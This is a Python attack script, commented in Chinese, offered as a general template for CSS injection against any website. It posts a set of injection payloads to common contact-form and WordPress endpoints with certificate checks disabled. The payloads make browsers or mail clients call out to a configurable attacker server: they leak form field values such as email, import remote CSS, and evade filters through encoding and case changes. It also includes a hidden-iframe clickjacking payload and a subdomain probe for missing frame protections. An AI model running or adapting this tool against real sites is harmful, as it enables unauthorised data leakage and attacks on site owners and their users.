#!/usr/bin/env python3
"""
CSS 高级攻击向量测试脚本 - 通用模板
适用于任何网站的 CSS 注入测试

用法:
  python test_css_advanced_attacks_template.py <目标URL> [攻击者服务器]

示例:
  python test_css_advanced_attacks_template.py https://example.com http://your-server.com
"""

import requests
import time
import json
import sys
from urllib.parse import urljoin

# 配置 - 可以通过命令行参数覆盖
TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
ATTACKER_SERVER = sys.argv[2] if len(sys.argv) > 2 else "http://your-attacker-server.com"

# 常见表单端点（需要根据目标调整）
COMMON_ENDPOINTS = [
    "/umbraco/api/contactform/submit",
    "/api/contact",
    "/api/feedback",
    "/api/subscribe",
    "/contact/submit",
    "/form/submit",
    "/api/enquiry",
    "/api/message",
    "/wp-admin/admin-ajax.php",  # WordPress
    "/index.php",  # 可能包含表单
]

# CSS Payload 集合
CSS_PAYLOADS = {
    "info_leak_basic": '<style>input[value]{background:url("' + ATTACKER_SERVER + '/leak")}</style>',
    "info_leak_email": '<style>input[name="email"]{background:url("' + ATTACKER_SERVER + '/leak?field=email")}</style>',
    "inline_style": '<div style="background:url(\'' + ATTACKER_SERVER + '/inline\')"></div>',
    "css_import": '<style>@import url(\'' + ATTACKER_SERVER + '/evil.css\');</style>',
    "html_entity": '&#x3C;style&#x3E;body{background:url("' + ATTACKER_SERVER + '/encoded")}&#x3C;/style&#x3E;',
    "uppercase": '<STYLE>body{background:url("' + ATTACKER_SERVER + '/uppercase")}</STYLE>',
    "css_variable": '<style>:root{--test:url("' + ATTACKER_SERVER + '/variable")}</style>',
    "clickjacking": '<iframe src="' + TARGET_URL + '" style="opacity:0"></iframe>',
}

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Content-Type': 'application/json',
    'Accept': 'application/json, text/plain, */*',
}

def test_css_injection(endpoint, css_payload_name, css_payload):
    """测试单个 CSS Payload"""
    url = urljoin(TARGET_URL, endpoint)
    
    # 将 CSS 注入到表单字段
    form_data = {
        'name': css_payload,
        'email': 'test@attacker.com',
        'company': 'Test Company',
        'country': 'Singapore',
        'comment': f'CSS Injection Test: {css_payload_name}',
        'phone': '+65 1234 5678'
    }
    
    try:
        response = requests.post(
            url,
            json=form_data,
            headers=HEADERS,
            timeout=15,
            verify=False
        )
        
        result = {
            'endpoint': endpoint,
            'payload_name': css_payload_name,
            'status': response.status_code,
            'response_headers': dict(response.headers),
        }
        
        # 分析响应
        if response.status_code == 200:
            result['verdict'] = 'SUCCESS'
            result['message'] = '提交成功！检查邮件和服务器日志'
        elif response.status_code == 400:
            result['verdict'] = 'REJECTED'
            result['message'] = '表单验证拒绝（字段不匹配或内容验证）'
        elif response.status_code == 403:
            result['verdict'] = 'BLOCKED'
            result['message'] = 'WAF 阻止（Cloudflare 或其他 WAF）'
        elif response.status_code == 404:
            result['verdict'] = 'NOT_FOUND'
            result['message'] = '端点不存在'
        else:
            result['verdict'] = 'UNKNOWN'
            result['message'] = f'状态码: {response.status_code}'
        
        return result
        
    except Exception as e:
        return {
            'endpoint': endpoint,
            'payload_name': css_payload_name,
            'status': 0,
            'verdict': 'ERROR',
            'message': f'请求失败: {e}'
        }

def test_subdomain_xframe():
    """测试子域名的 X-Frame-Options"""
    print("\n" + "=" * 80)
    print("测试子域名点击劫持防护")
    print("=" * 80)
    
    # 从目标 URL 提取域名
    from urllib.parse import urlparse
    parsed = urlparse(TARGET_URL)
    domain = parsed.netloc.replace('www.', '')
    
    # 常见子域名
    subdomains = [
        f'webint.{domain}',
        f'media.{domain}',
        f'api.{domain}',
        f'mail.{domain}',
        f'cdn.{domain}',
    ]
    
    results = []
    
    for subdomain in subdomains:
        print(f"\n测试子域名: {subdomain}")
        
        try:
            response = requests.get(
                f'https://{subdomain}',
                timeout=10,
                verify=False,
                allow_redirects=False,
                headers={'User-Agent': HEADERS['User-Agent']}
            )
            
            xfo = response.headers.get('X-Frame-Options', 'Not Set')
            csp = response.headers.get('Content-Security-Policy', 'Not Set')
            
            print(f"  X-Frame-Options: {xfo}")
            print(f"  CSP frame-ancestors: {'YES' if 'frame-ancestors' in csp else 'NO'}")
            
            # 判断是否容易被点击劫持
            vulnerable = False
            if xfo == 'Not Set' or xfo == '':
                vulnerable = True
                print(f"  [!] 未设置 X-Frame-Options！")
            
            if 'frame-ancestors' not in csp:
                vulnerable = True
                print(f"  [!] CSP 未限制 frame-ancestors！")
            
            if vulnerable:
                print(f"  [!!!] 可能存在点击劫持风险！")
            
            results.append({
                'subdomain': subdomain,
                'x_frame_options': xfo,
                'csp_frame_ancestors': 'frame-ancestors' in csp,
                'vulnerable': vulnerable
            })
            
        except Exception as e:
            print(f"  [x] 访问失败: {e}")
            results.append({
                'subdomain': subdomain,
                'error': str(e)
            })
        
        time.sleep(1)
    
    return results

def main():
    print("=" * 80)
    print("CSS 高级攻击向量测试 - 通用模板")
    print(f"目标: {TARGET_URL}")
    print(f"攻击者服务器: {ATTACKER_SERVER}")
    print("=" * 80)
    print("\n 重要提示:")
    print("  1. 确保 ATTACKER_SERVER 可以接收并记录请求")
    print("  2. 使用测试邮箱接收自动回复邮件")
    print("  3. 检查邮件 HTML 源码确认 CSS 渲染")
    print("=" * 80)
    
    all_results = {
        'target': TARGET_URL,
        'attacker_server': ATTACKER_SERVER,
        'css_injection_tests': [],
        'subdomain_tests': [],
        'summary': {}
    }
    
    # 测试 CSS 注入
    print("\n" + "=" * 80)
    print("测试 CSS 注入")
    print("=" * 80)
    
    for endpoint in COMMON_ENDPOINTS:
        print(f"\n测试端点: {endpoint}")
        
        for payload_name, payload in CSS_PAYLOADS.items():
            print(f"  测试: {payload_name}")
            
            result = test_css_injection(endpoint, payload_name, payload)
            all_results['css_injection_tests'].append(result)
            
            # 打印结果
            if result['verdict'] == 'SUCCESS':
                print(f"    [!!!] {result['message']}")
            elif result['verdict'] == 'REJECTED':
                print(f"    [-] {result['message']}")
            elif result['verdict'] == 'BLOCKED':
                print(f"    [x] {result['message']}")
            elif result['verdict'] == 'NOT_FOUND':
                print(f"    [x] {result['message']}")
                break  # 端点不存在，跳过其他 payload
            else:
                print(f"    [?] {result['message']}")
            
            time.sleep(1)  # 避免触发速率限制
    
    # 测试子域名
    subdomain_results = test_subdomain_xframe()
    all_results['subdomain_tests'] = subdomain_results
    
    # 统计
    total_tests = len(all_results['css_injection_tests'])
    successful = sum(1 for r in all_results['css_injection_tests'] if r.get('verdict') == 'SUCCESS')
    blocked = sum(1 for r in all_results['css_injection_tests'] if r.get('verdict') == 'BLOCKED')
    rejected = sum(1 for r in all_results['css_injection_tests'] if r.get('verdict') == 'REJECTED')
    vulnerable_subdomains = sum(1 for r in subdomain_results if r.get('vulnerable'))
    
    all_results['summary'] = {
        'total_tests': total_tests,
        'successful_submissions': successful,
        'blocked_by_waf': blocked,
        'rejected_by_form': rejected,
        'vulnerable_subdomains': vulnerable_subdomains,
    }
    
    # 保存结果
    filename = 'css_attack_test_results.json'
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(all_results, f, indent=2, ensure_ascii=False)
    
    print(f"\n[OK] 详细结果已保存到: {filename}")
    
    # 打印总结
    print("\n" + "=" * 80)
    print("测试总结")
    print("=" * 80)
    
    print(f"\nCSS 注入测试:")
    print(f"  总测试数: {total_tests}")
    print(f"  成功提交: {successful}")
    print(f"  被 WAF 阻止: {blocked}")
    print(f"  被表单拒绝: {rejected}")
    
    print(f"\n子域名点击劫持测试:")
    print(f"  脆弱子域名: {vulnerable_subdomains}")
    
    print("\n" + "=" * 80)
    print("下一步行动:")
    print("=" * 80)
    
    if successful > 0:
        print("\n[!!!] CSS 注入成功！")
        print("立即检查:")
        print(f"  1. 你的测试邮箱是否收到自动回复邮件")
        print(f"  2. 邮件 HTML 源码中是否包含 CSS")
        print(f"  3. {ATTACKER_SERVER} 服务器日志是否有请求")
        print("  4. 如果收到请求，说明 CSS 被执行了！")
    else:
        print("\n[-] 所有 CSS Payload 都被拒绝")
        print("可能原因:")
        print("  - 表单字段不匹配")
        print("  - WAF 过滤 CSS")
        print("  - 需要找到其他注入点（邮件、文件上传等）")
    
    if vulnerable_subdomains > 0:
        print("\n[!] 发现易受点击劫持的子域名！")
        print("可以进一步测试:")
        print("  - 在这些子域名上测试 iframe 嵌入")
        print("  - 创建点击劫持 POC")
    
    print("\n" + "=" * 80)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("用法: python test_css_advanced_attacks_template.py <目标URL> [攻击者服务器]")
        print("示例: python test_css_advanced_attacks_template.py https://example.com http://your-server.com")
        sys.exit(1)
    
    main()
